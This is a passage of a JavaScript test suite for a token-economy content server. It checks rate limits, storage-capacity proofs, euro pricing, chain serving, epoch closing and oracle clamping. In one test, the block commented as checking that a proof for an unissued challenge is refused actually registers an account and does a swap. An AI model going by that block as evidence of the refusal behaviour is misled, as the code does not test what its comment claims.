  assert.equal(next.body.i, 2);
  const replayed = await b.send(second.log.acts[0]);
  assert.equal(replayed.body.code, 'ALREADY_REGISTERED');
});

test('the rate limiter refuses before the economy has to, and says when to retry', async (t) => {
  // Twelve acts a minute; bootstrap spends seven of them getting two accounts
  // funded, which leaves five.
  const ctx = await bootstrap(t, { rateLimit: { act: 12, read: 1200, upload: 60 } });

  const codes = [];
  for (let n = 0; n < 8; n++) {
    const res = await ctx.api.act({ t: ctx.clock.t, as: ADDR.alice, k: 'capBuy', ptp: String(2000000000000000 + n) }, PK.alice);
    codes.push(res.body.code || 'ok');
    if (res.body.code === 'RATE_LIMIT') {
      assert.equal(res.status, 429);
      assert.ok(Number(res.body.detail.retryAfterSec) > 0);
    }
  }
  assert.ok(codes.includes('RATE_LIMIT'), 'the limit binds');
  assert.equal(codes.indexOf('RATE_LIMIT'), 5, 'and binds exactly where the budget runs out');

  // Reads keep working while writes are limited: a host that stops answering
  // questions because somebody wrote too much is a host that punishes the wrong
  // person.
  assert.equal((await ctx.api.get('/api/v1/status')).status, 200);
});

// ═══════════════════════════════════════════════════════════════════════════
// capacity
// ═══════════════════════════════════════════════════════════════════════════

test('a challenge is issued, answered, credited — and a wrong answer is not', async (t) => {
  const ctx = await bootstrap(t);
  const { pid, cid, bytes } = await publish(ctx);

  // Before anybody pledges, the ledger says so rather than showing an empty
  // table with no explanation.
  const empty = await ctx.api.get('/api/v1/capacity');
  assert.equal(empty.body.providers.length, 0);
  assert.equal(empty.body.nodes, 0);

  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'capPledge', mb: 1000, endpoint: 'https://bob.example/shards' }, PK.bob);

  const issued = await ctx.api.get(`/api/v1/capacity/challenges?as=${ADDR.bob}`);
  assert.equal(issued.status, 200);
  assert.ok(issued.body.challenges.length >= 1, 'one node holds every shard');
  const challenge = issued.body.challenges[0];
  assert.equal(challenge.pid, pid);
  assert.equal(challenge.boundMs, Number(PARAMS.capProofLatencyBoundMs));

  // A wrong answer earns nothing.
  const wrong = await ctx.api.act(
    { t: ctx.clock.t, as: ADDR.bob, k: 'capProof', challenge: { pid, shard: challenge.shard }, answer: 'f'.repeat(64) },
    PK.bob,
  );
  assert.equal(wrong.body.code, 'CAPACITY_PROOF_WRONG');
  assert.equal(ctx.srv.world.capacity.providers[ADDR.bob].proven, 0n);

  // The right one, computed the way any holder would compute it: from the
  // public seed, over bytes it actually has.
  const window = challengeFor(cid, challenge.shard, issued.body.seed, challenge.shardBytes);
  assert.deepEqual({ offset: window.offset, length: window.length }, { offset: challenge.offset, length: challenge.length });
  const answer = answerChallenge(new Uint8Array(bytes), window);
  const right = await ctx.api.act(
    { t: ctx.clock.t, as: ADDR.bob, k: 'capProof', challenge: { pid, shard: challenge.shard }, answer },
    PK.bob,
  );
  assert.equal(right.status, 200, JSON.stringify(right.body));
  assert.ok(ctx.srv.world.capacity.providers[ADDR.bob].proven > 0n);

  // A proof for a challenge this host never put is refused: without an issue
  // record there is no instant to measure the answer against, and the latency
  // bound is the only thing that tells three disks from one.
  const unissued = await ctx.api.act(
    { t: ctx.clock.t, as: ADDR.carol, k: 'register', handle: 'carol' },
    PK.carol,
  );
  assert.equal(unissued.status, 200);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'swap', sell: 'ptp', amt: '1000000000000000000', minOut: '1' }, PK.bob);

  // And the money: capClaim draws the post's own escrow, not a global pot.
  const claim = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'capClaim' }, PK.bob);
  assert.equal(claim.status, 200, JSON.stringify(claim.body));
  assert.ok(ctx.srv.world.capacity.providers[ADDR.bob].paidPtp > 0n);

  const ledger = await ctx.api.get('/api/v1/capacity');
  const row = ledger.body.providers.find((p) => p.address === ADDR.bob);
  assert.equal(row.pledgedMb, 1000);
  assert.ok(row.challengeable >= 1);
  assert.equal(row.note, null);
});

test('a pledge nobody can challenge earns nothing, and the ledger says which reason', async (t) => {
  const ctx = await bootstrap(t);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'capPledge', mb: 500, endpoint: 'https://bob.example/shards' }, PK.bob);

  const before = await ctx.api.get('/api/v1/capacity');
  const row = before.body.providers.find((p) => p.address === ADDR.bob);
  assert.equal(row.challengeable, 0);
  assert.equal(row.provenUnits, '0');
  assert.match(row.note, /no shard is placed/);

  const challenges = await ctx.api.get(`/api/v1/capacity/challenges?as=${ADDR.bob}`);
  assert.equal(challenges.body.challenges.length, 0);
  assert.match(challenges.body.note, /earns nothing/);

  const claim = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'capClaim' }, PK.bob);
  assert.equal(claim.body.code, 'CAPACITY_PLEDGE_UNPROVEN');
});

// ═══════════════════════════════════════════════════════════════════════════
// the read surface the client is built against
// ═══════════════════════════════════════════════════════════════════════════

test('the feed carries euro prices in both units, and the dust flag the card needs', async (t) => {
  const ctx = await bootstrap(t);
  const { pid } = await publish(ctx, { priceNano: String(PARAMS.viewPriceMinNanoEur) });

  const feed = await ctx.api.get('/api/v1/feed');
  assert.equal(feed.status, 200);
  const card = feed.body.posts.find((p) => p.pid === pid);
  assert.equal(card.price.view.nanoEur, String(PARAMS.viewPriceMinNanoEur));
  // Compared against core/pricing.mjs's own formatter rather than a literal: the
  // string carries a narrow no-break space and a no-break space before the sign,
  // and a literal here would be a second opinion about which characters those are.
  assert.equal(card.price.view.eur, formatEur(PARAMS.viewPriceMinNanoEur));
  assert.match(card.price.view.eur, /^0\.000.02.€$/u);
  assert.equal(card.price.view.dust, false, 'no priced item in this economy converts to nothing');
  assert.ok(BigInt(card.price.view.wei) > 0n);
  assert.equal(card.media, `/media/${card.cid}?exp=${card.expires}`, 'the sw needs the expiry on the URL');
  assert.equal(BigInt(card.price.comment.nanoEur), BigInt(card.price.view.nanoEur) * 20n);
  assert.equal(BigInt(card.price.like.nanoEur), BigInt(card.price.view.nanoEur) * 10n);
});

test('a quote names the fill, the impact and a minOut, and the act to send', async (t) => {
  const ctx = await bootstrap(t);
  const q = await ctx.api.get('/api/v1/pool/quote?sell=btc&amt=100000&slippageBps=50');
  assert.equal(q.status, 200);
  assert.ok(BigInt(q.body.out) > 0n);
  assert.equal(q.body.act.k, 'swap');
  assert.equal(q.body.act.sell, 'btc');
  assert.equal(BigInt(q.body.minOut), (BigInt(q.body.out) * 9950n) / 10000n);

  // And the swap fills at or above it.
  const done = await ctx.api.send(signAct({ t: ctx.clock.t, as: ADDR.alice, ...q.body.act }, PK.alice));
  assert.equal(done.status, 200, JSON.stringify(done.body));

  const bad = await ctx.api.get('/api/v1/pool/quote?sell=btc&amt=notanumber');
  assert.equal(bad.body.code, 'BAD_AMOUNT');
});

test('the wallet reports balances as strings and the next view sequence', async (t) => {
  const ctx = await bootstrap(t);
  const res = await ctx.api.get(`/api/v1/wallet/${ADDR.alice}`);
  assert.equal(res.status, 200);
  assert.equal(res.body.account.handle, 'alice');
  assert.equal(typeof res.body.account.ptp, 'string', 'money is never a JSON number');
  assert.equal(typeof res.body.account.sat, 'string');
  assert.equal(typeof res.body.account.cap, 'string');
  assert.equal(res.body.account.nextViewSeq, 0);
  assert.ok(BigInt(res.body.account.cap) > 0n);
  assert.match(res.body.account.ptpEur, /€$/);
});

test('the status endpoint reports what replay skipped and what the log lost', async (t) => {
  const ctx = await bootstrap(t);
  const res = await ctx.api.get('/api/v1/status');
  assert.equal(res.body.ok, true);
  assert.equal(res.body.writer, true);
  assert.equal(res.body.log.skipped, 0);
  assert.equal(res.body.log.truncatedBytes, 0);
  assert.equal(res.body.log.count, res.body.log.applied);
  assert.equal(res.body.editions.replay.length, 64);
  assert.equal(res.body.accounts, 2);
});

test('the chain endpoints answer honestly when no block has been built', async (t) => {
  const ctx = await bootstrap(t);
  const head = await ctx.api.get('/api/chain/head');
  assert.equal(head.body.code, 'EPOCH_NOT_CLOSED');
  assert.equal(head.body.detail.built, false);
  assert.match(head.body.detail.next, /build\.mjs/);
  const all = await ctx.api.get('/api/chain');
  assert.equal(all.body.code, 'EPOCH_NOT_CLOSED');
});

test('the chain is passed through byte for byte, not re-encoded', async (t) => {
  const ctx = await bootstrap(t);

  // Exactly the shape server/chain/build.mjs writes: a canonical JSON array, one
  // block per line. A verifier checking a stateRoot or a producer signature needs
  // the bytes the producer signed, so this host must hand back the same bytes and
  // not a faithful-looking re-serialisation of the values inside them.
  const chainText = '[\n{"epoch":0,"height":0,"stateRoot":"' + 'ab'.repeat(32) + '"}\n]\n';
  await writeFile(join(ctx.dir, 'chain.json'), chainText, 'utf8');
  const blockText = '{"epoch":0,"height":0,"stateRoot":"' + 'ab'.repeat(32) + '"}\n';
  await mkdir(join(ctx.dir, 'chain'), { recursive: true });
  await writeFile(join(ctx.dir, 'chain', 'head.json'), blockText, 'utf8');

  const all = await ctx.api.raw('/api/chain');
  assert.equal(all.status, 200);
  assert.equal(all.bytes.toString('utf8'), chainText);
  assert.match(all.headers.get('content-type'), /application\/json/);

  const head = await ctx.api.raw('/api/chain/head');
  assert.equal(head.bytes.toString('utf8'), blockText);
});

test('the oracle and the epoch block are signed by one key', async (t) => {
  const ctx = await bootstrap(t);
  assert.match(ctx.srv.key.publicKeyHex, /^[0-9a-f]{64}$/);
  // When server/chain/keys.mjs is installed the writer uses ITS key, so the
  // signature on a published rate and the signature on the block that sealed the
  // epoch it priced are the same claim by the same producer.
  const chainKeyFile = join(ctx.dir, 'chain', 'producer.key');
  if (ctx.srv.key.shared) {
    assert.equal(ctx.srv.key.path, chainKeyFile);
    await stat(chainKeyFile);
  }
  const sig = ctx.srv.key.sign({ hello: 'world' });
  assert.ok(ctx.srv.key.verify({ hello: 'world' }, sig));
  assert.equal(ctx.srv.key.verify({ hello: 'other' }, sig), false);
});

test('the rules module is published with its source and its hash', async (t) => {
  const ctx = await bootstrap(t);
  const res = await ctx.api.get('/api/v1/rules');
  assert.equal(res.status, 200);
  assert.equal(res.body.version, 'v1');
  assert.equal(res.body.hash, createHash('sha256').update(res.body.source).digest('hex'));
  assert.match(res.body.source, /export function credit/);
  assert.match(res.body.formula, /min\(/);
  assert.equal(res.body.key, null, 'no rule key is named in this deployment, so rulesSet is refused from everybody');
});

// ═══════════════════════════════════════════════════════════════════════════
// closing an epoch
// ═══════════════════════════════════════════════════════════════════════════

test('an epoch closes because an act landed, and pays the creator a rebate on burn', async (t) => {
  const ctx = await bootstrap(t);
  const { pid } = await publish(ctx);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'like', pid }, PK.bob);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'comment', pid, text: 'good light' }, PK.bob);

  const burned = ctx.srv.world.epoch.burnedWei;
  const before = ctx.srv.world.accounts[ADDR.alice].ptp;
  const emittedBefore = ctx.srv.world.supply.emitted;
  assert.ok(burned > 0n, 'engagement destroyed PTP');

  // Too early: an epoch closes when its own length has elapsed, and the bound is
  // in the rulebook rather than in this host, so a writer cannot walk the
  // emission schedule forward by asking.
  const early = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'closeEpoch' }, PK.bob);
  assert.equal(early.body.code, 'EPOCH_NOT_CLOSED');

  ctx.clock.t += Number(PARAMS.epochSeconds) * 1000 + 1000;
  const closed = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'closeEpoch' }, PK.bob);
  assert.equal(closed.status, 200, JSON.stringify(closed.body));

  const w = ctx.srv.world;
  assert.equal(w.epoch.n, 1);
  assert.equal(w.epoch.burnedWei, 0n, 'the new epoch starts at zero');
  assert.deepEqual(w.history, [burned], 'and the closed epoch\'s burn is the baseline the spike rail measures against');

  // Emission is a rebate on the burn this creator's own content caused: 70% of
  // it, and no share of anybody else's.
  const minted = w.supply.emitted - emittedBefore;
  assert.ok(minted > 0n);
  assert.equal(w.accounts[ADDR.alice].ptp - before, minted, 'all of it to the one creator who had an audience');
  assert.ok(minted < burned, 'and less than was destroyed, which is why supply only ever falls');
  assert.ok((minted * 10000n) / burned <= PARAMS.emissionCapBps, 'never more than the coupling allows');

  const status = await ctx.api.get('/api/v1/status');
  assert.equal(status.body.epoch.n, 1);
});

test('a closeEpoch carrying a live oracle seals a NEW rate, and the clamp bites', async (t) => {
  const ctx = await bootstrap(t);
  const nano = (eur) => BigInt(eur) * 1000000000n;
  // Five sources, as decimal strings — the only spelling of a rate a JSON act
  // can carry. core/pricing.mjs's `sealRate` used to demand bigints, which no
  // transport has, so every closeEpoch carrying an oracle was refused and the
  // sealed rate stayed at the genesis 90,000 EUR/BTC for the life of the network
  // while this host went on reading, signing and publishing five live sources
  // that nothing consumed. This is the host end of that repair.
  const reading = (eur) => ({ sources: Array.from({ length: 5 }, () => nano(eur).toString()) });

  assert.equal(ctx.srv.world.epoch.oracle.eurPerBtcNano, nano(90000), 'the genesis rate');

  const { pid } = await publish(ctx);
  await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'view', pid, dwellMs: 2000, seq: 0 }, PK.bob);

  // Epoch 0 to 1, inside the +/-10% band: the rate the act carried is sealed
  // whole, and it is not the rate the network started with.
  ctx.clock.t += Number(PARAMS.epochSeconds) * 1000 + 1000;
  const first = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'closeEpoch', oracle: reading(95000) }, PK.bob);
  assert.equal(first.status, 200, JSON.stringify(first.body));
  assert.equal(ctx.srv.world.epoch.oracle.eurPerBtcNano, nano(95000), 'the sealed rate MOVED');
  assert.equal(ctx.srv.world.epoch.oracle.epoch, 1, 'and it is stamped with the epoch it prices');
  assert.equal(ctx.srv.world.epoch.oracle.poolSat, ctx.srv.world.pool.sat, 'both legs are frozen together');
  assert.equal(ctx.srv.world.epoch.oracle.poolPtpWei, ctx.srv.world.pool.ptp);

  // Epoch 1 to 2, far outside the band: the observation is kept out and the
  // bound is sealed instead. 95,000 plus 10% is 104,500, not the 200,000 that
  // was offered — a sustained 2x distortion costs eight epochs of public lying.
  ctx.clock.t += Number(PARAMS.epochSeconds) * 1000 + 1000;
  const second = await ctx.api.act({ t: ctx.clock.t, as: ADDR.bob, k: 'closeEpoch', oracle: reading(200000) }, PK.bob);
  assert.equal(second.status, 200, JSON.stringify(second.body));
  const sealed = ctx.srv.world.epoch.oracle;
  assert.equal(sealed.eurPerBtcNano, (nano(95000) * (10000n + PARAMS.oracleMaxMoveBps)) / 10000n);
  assert.equal(sealed.eurPerBtcNano, nano(104500), 'the clamp bit');
  assert.notEqual(sealed.eurPerBtcNano, nano(200000));

  // The read surface shows what the epoch actually prices with, which is the
  // sealed pair and never the live pool.
  const pool = await ctx.api.get('/api/v1/pool');
  assert.equal(pool.body.pool.sealed.eurPerBtcNano, nano(104500).toString());

  // And it is in the block. Each block names the rate ITS OWN epoch priced with,
  // while its state package carries the rate the next epoch will use — two
  // different numbers, both sealed, so a price is reproducible from the block
  // alone with no access to a live pool or a live oracle.
  const report = buildChain({ dir: ctx.dir });
  assert.equal(report.blocks, 2);
  const served = await ctx.api.raw('/api/chain');
  assert.equal(served.status, 200);
  const chain = parseCanonical(served.bytes.toString('utf8'));
  assert.equal(chain.length, 2);
  assert.equal(chain[0].epoch, 0);
  assert.equal(chain[0].oracle.eurPerBtcNano, nano(90000), 'epoch 0 priced at the genesis rate');
  assert.equal(chain[1].epoch, 1);
  assert.equal(chain[1].oracle.eurPerBtcNano, nano(95000), 'epoch 1 priced at what the first close sealed');
  assert.equal(chain[1].package.oracle.eurPerBtcNano, nano(104500), 'and the clamped rate is sealed for the next one');
});

test('close-epoch.mjs closes an epoch over HTTP, and refuses to before it is due', async (t) => {
  // A real clock, an epoch length of one second, and a start ten seconds ago, so
  // the script's own stamp is forward of the log and inside the writer's skew
  // window without anything being pretended at.
  const ctx = await bootstrap(t, {
    startAt: Date.now() - 10000,
    params: { ...PARAMS, epochSeconds: 1n },
  });
  const script = fileURLToPath(new URL('../server/scripts/close-epoch.mjs', import.meta.url));
  const run = (args) =>
    new Promise((done) => {
      const child = spawn(process.execPath, [script, ...args], { stdio: ['ignore', 'pipe', 'pipe'] });
      let out = '';
      let err = '';
      child.stdout.on('data', (d) => (out += d));
      child.stderr.on('data', (d) => (err += d));
      child.on('close', (code) => done({ code, out, err }));
    });

  const dry = await run(['--url', ctx.url, '--key', PK.bob, '--dry']);
  assert.equal(dry.code, 0, dry.err);
  assert.match(dry.out, /"k":"closeEpoch"/);
  assert.match(dry.out, /dry run — nothing sent/);
  assert.equal(ctx.srv.world.epoch.n, 0, 'a dry run sends nothing');

  const real = await run(['--url', ctx.url, '--key', PK.bob]);
  assert.equal(real.code, 0, real.err);
  assert.match(real.out, /closed   epoch 0 sealed as act/);
  assert.equal(ctx.srv.world.epoch.n, 1);

  // The next one is not due for another second, and the script says so rather
  // than sending an act the rulebook would refuse.
  const tooSoon = await run(['--url', ctx.url, '--key', PK.bob]);
  assert.equal(tooSoon.code, 1);
  assert.match(tooSoon.err, /EPOCH_NOT_CLOSED/);

  // And without a key it explains what it needs instead of throwing.
  const keyless = await run(['--url', ctx.url]);
  assert.equal(keyless.code, 1);
  assert.match(keyless.err, /needs a key/);
});

test('a host that is not the writer refuses to write and keeps answering reads', async (t) => {
  const ctx = await bootstrap(t, { isWriter: () => false });
  const res = await ctx.api.act({ t: ctx.clock.t, as: ADDR.carol, k: 'register', handle: 'carol' }, PK.carol);
  assert.equal(res.body.code, 'NOT_THE_WRITER');
  assert.equal(res.status, 503);
  const status = await ctx.api.get('/api/v1/status');
  assert.equal(status.status, 200);
  assert.equal(status.body.writer, false);
});
